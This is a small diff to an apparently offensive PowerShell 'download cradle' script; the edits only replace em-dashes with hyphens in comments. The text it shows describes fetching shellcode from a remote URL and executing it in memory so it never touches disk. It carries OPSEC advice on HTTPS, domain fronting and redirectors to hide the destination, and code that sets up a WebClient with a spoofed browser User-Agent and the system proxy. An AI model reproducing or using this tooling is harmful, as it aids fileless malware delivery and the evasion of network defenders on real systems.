@@ -3,7 +3,7 @@
 # ============================================================================
 # Technique:  Download shellcode from URL, execute entirely in memory
 # OPSEC Notes:
-#   - Shellcode never touches disk — download directly to memory.
+#   - Shellcode never touches disk - download directly to memory.
 #   - Network connection to payload URL is visible to network monitoring.
 #   - Use HTTPS to encrypt the payload in transit.
 #   - Consider domain fronting or redirectors to obscure the true destination.
@@ -63,7 +63,7 @@ public class Win32Cradle {
 }
 "@
 
-# Download shellcode into memory — never touches disk
+# Download shellcode into memory - never touches disk
 $WebClient = New-Object System.Net.WebClient
 $WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 $WebClient.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
